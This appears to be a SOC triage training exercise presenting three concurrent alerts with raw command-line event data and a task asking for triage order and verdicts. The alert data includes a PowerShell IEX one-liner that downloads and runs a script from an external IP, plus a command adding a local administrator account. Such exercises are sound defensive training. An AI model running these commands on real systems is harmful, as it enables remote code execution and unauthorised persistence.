# Case 012 — Phase 2 Batch: 3 Concurrent Alerts

**Incident ID:** IR-2026-028
**Date Detected:** 2026-07-05
**Host:** JIMIL-JOSHI
**Reported By:** SOC Monitoring (Splunk Alert)
**Status:** 🔴 Open — Pending Triage

**Phase:** 2 — Mixed batch triage.

---

## 🎫 Alert Summary — Batch of 3

| Alert | Type | SIEM-Assigned Severity |
|---|---|---|
| Alert J | New user added to local Administrators group | 🔴 High |
| Alert K | PowerShell downloading and executing in one line (IEX) | 🔴 High |
| Alert L | Outbound RDP connection to external IP | 🟠 Medium |

---

## 📄 Raw Event Data

### Alert J
```
Process_Command_Line: net localgroup administrators hpbackup /add
Account: hp | Parent: cmd.exe
```

### Alert K
```
Process_Command_Line: powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://45.142.212.61/s.ps1')"
Account: hp | Parent: cmd.exe
```

### Alert L
```
Process_Command_Line: mstsc.exe /v:203.0.113.50
Account: hp | Parent: explorer.exe
```

---

## 🎯 Task

1. Determine triage order across all 3 alerts and justify it.
2. Investigate each alert independently.
3. Give a verdict (TP/FP/Ambiguous) for each with justification.
